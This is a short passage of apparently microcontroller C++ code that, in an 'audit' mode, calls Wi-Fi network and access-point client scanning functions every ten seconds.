    if (modoAtual == AUDITORIA) {
        if (millis() - last > 10000) { scanNetworks(); last = millis(); }
        if (millis() - last2 > 10000) { scanAPClients(); last2 = millis(); }
    }
}
